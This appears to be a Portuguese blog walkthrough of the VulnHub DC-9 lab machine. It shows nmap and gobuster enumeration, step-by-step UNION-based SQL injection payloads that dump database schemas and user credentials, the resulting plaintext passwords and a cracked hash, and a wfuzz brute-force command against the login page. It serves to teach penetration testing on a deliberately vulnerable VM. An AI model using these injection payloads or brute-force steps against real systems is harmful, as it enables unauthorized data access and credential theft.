---
title: "VulnHub - DC-9"
tags: [Linux,Hard]
categories: VulnHub
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/inicial.png)

Link: <https://www.vulnhub.com/entry/dc-9,412/>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta (Não vou rodar essa flag pq teve uma saída bem bizarra)

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Porta 22 -> Servidor SSH

> Porta 80 -> Servidor Web

## Enumeração da Porta 80 (Web)

Primeira coisa a se fazer sempre é verificar o que está sendo executado na porta 80, então vamos abrir o navegador para ver

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/web.png)

Pelo estilo de site, tem muito cara de ser Drupal, pelas cores e tudo mais, mas não é! É um php simples mesmo.

### Gobuster

Como de costume quando temos um website vamos jogar para o Gobuster pra vermos o que pode ser feito nesse site

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/gobuster.png)

Nada de importante

### SQLInjection

Vamos analisar a página pra ver se encontramos alguma coisa que possa ser explorada nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/sql.png)

Pesquisamos dentro da aba `manager.php` pelo usuário Tom, e a saida deu certo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/sql1.png)

Vamos tentar agora um clássico SQLInjection com `'-- -` e vemos que deu certo também!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/sql2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/sql3.png)

Mas o que quer dizer isso?

#### Entendendo SQLInjection

A query que está sendo feita para o banco de dados, pode ser essa:

**SELECT * FROM USERS WHERE FIRST_NAME = 'USERINPUT'**

E o nós fizemos por primeiro?

**SELECT * FROM USERS WHERE FIRST_NAME = 'USERINPUT''**

Adicionamos uma aspa simples, por isso deu falha, na segunda vez adicionamos o comentário

**SELECT * FROM USERS WHERE FIRST_NAME = 'USERINPUT'-- -'**

Ou seja, tudo que estiver depois do comentário foi desconsiderado pelo servidor

#### Explorando UNION Injection

Para o parâmetro UNION funcionar, devemos saber todos os parâmetros que vão no '*', isso teoricamente está fácil de ver

Aqui estão eles!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/sql4.png)

**SELECT ID,NAME,POSITION,PHONE,EMAIL FROM USERS WHERE FIRST_NAME = 'USERINPUT' UNION-- -'**

Para descobrirmos a quantidade exata de parâmetros temos dois modos, o primeiro através do burpsuite

#### UNION SELECT

Mandamos o Results.php para o Burp

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp.png)

Agora para o Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp1.png)

E vamos alterando a quantiade de posições até dar o que queremos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp2.png)

Aqui no caso vimos que são 6, ou seja, 6 posições

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp3.png)

Mostrando no site, temos isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp4.png)

#### ORDER BY

Também podemos descobrir a quantidade de parâmetros através do **ORDER BY**

Nós vamos testando, 1,2,3,4,5,6... até ele dar um tamanho diferente da requisição, mas pq 7? Pq até 6 é uma requisição válida, então ele vai retornar um valor válido, quando eu coloco 7 ele não consegue ordernar por 7, ai eu sei que tem 6

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp5.png)

### Extraindo Informações

Agora que já sabemos a quantidade de dados e parâmetros que devem ser passados, vamos iniciar a extração de informações desse banco de dados.

Assim sabemos que a database que está sendo utilizada é a Staff

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp6.png)

Vamos utilizar da INFORMATION_SCHEMA, que é um padrão do mysql, ele tem um "rascunho" de todas as colunas e tabelas do banco de dados

Aqui está o site onde podem ser retiradas as informações necessárias sobre essa tabela [Information Schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)

**database = SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA**

E aqui temos o Staff novamente, que é a database dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp7.png)

Vamos extrair agora as Tables, para isso vamos usar a query **Group Concat** pois ela possibilita termos mais de um resultado na mesma linha, 
facilitando assim a extração de informações

Aqui temos todas as databases deles

**search=Tom' UNION SELECT GROUP_CONCAT(SCHEMA_NAME),2,3,4,5,6 from INFORMATION_SCHEMA.SCHEMATA-- -**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp11.png)

**search=Tom' UNION SELECT GROUP_CONCAT(TABLE_NAME),2,3,4,5,6 from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = "Staff"-- -**

E aqui vemos que temos duas Tables, a **StaffDetails** e a **Users**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp8.png)

Vamos extrair primeiro informações da StaffDetails

**search=Tom' UNION SELECT GROUP_CONCAT(COLUMN_NAME),2,3,4,5,6 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = "Staff"-- -**

E aqui estão as colunas dessa table

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp9.png)

Agora verificamos todos as duas tables, a StaffDetails e a Users

**search=Tom' UNION SELECT GROUP_CONCAT(TABLE_NAME,":",COLUMN_NAME),2,3,4,5,6 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = "Staff"-- -**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp10.png)

Deu confusão? Vamos tentar destrinchar melhor

**search=Tom' UNION SELECT GROUP_CONCAT(COLUMN_NAME),2,3,4,5,6 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = "Staff" AND TABLE_NAME = "Users"-- -**

O que essa query vai me trazer? Traduzindo... me traga o nome das colunas (COLUMN_NAME) dentro da information schema de todas as colunas (INFORMATION_SCHEMA.COLUMNS) onde eu quero somente da database Staff (TABLE_SCHEMA) e o nome da tabela dentro dessa database é Users (TABLE_NAME). Ficou melhor assim?

Agora a mesma coisa para a database 'users'

**search=Tom' UNION SELECT GROUP_CONCAT(TABLE_NAME,":",COLUMN_NAME),2,3,4,5,6 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = "users"-- -**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp12.png)

Certo, agora vamos extrair aquelas informações da database Staff com as tables Username e Password

**search=Tom' UNION SELECT GROUP_CONCAT(Username,":",Password),2,3,4,5,6 from Staff.Users-- -**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp13.png)

```
admin:856f5de590ef37314e7c3bdf6f8a66dc
```

E agora extrair os usuários e passwords da outra database a 'users'

**search=Tom' UNION SELECT GROUP_CONCAT(Username,":",Password),2,3,4,5,6 from users.UserDetails-- -**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/burp14.png)

Vamos dar uma arrumada nisso com o sed

```
marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC&TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0
```

```bash
sed "s/,/\n/g"
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/senhas.png)

```
marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1
barneyr:RocksOff
tomc:TC&TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D!
joeyt:Passw0rd
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scoots:YR3BVxxxw87
janitor:Ilovepeepee
janitor2:Hawaii-Five-0
```

Quebramos o hash também

```
856f5de590ef37314e7c3bdf6f8a66dc:transorbital1
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/senha1.png)

### Brute Force com wfuzz

Agora que temos várias senhas e usuários, vamos realizar um ataque de força bruta nessa aplicação, mais precisamente no manage.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/brute.png)

Mandamos uma requisição para o burp, pra ver como ele é estruturada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/brute1.png)

Vemos que não possui nenhum mecanismo de defesa, então podemos fazer um bruteforce com o wfuzz nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/brute2.png)

Então arrumamos a lista de user e senhas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/users.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/senhas1.png)

```bash
wfuzz -c -z file,usuarios.txt -z file,senhas.txt -m zip -d "username=FUZZ&password=FUZ2Z" http://192.168.56.101/manage.php
```

Agora realizamos o brute force na página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/wfuzz.png)

Encontramos um usuário válido, o admin, vamos tentar logar pra ver o que da

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/wfuzz1.png)

O que nos chamou atenção foi esse **File does not exist** o que nos indica que possivelmente vamos ter que fazer outro fuzzing ai atrás de parâmetros

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-dc9/wfuzz2.png)


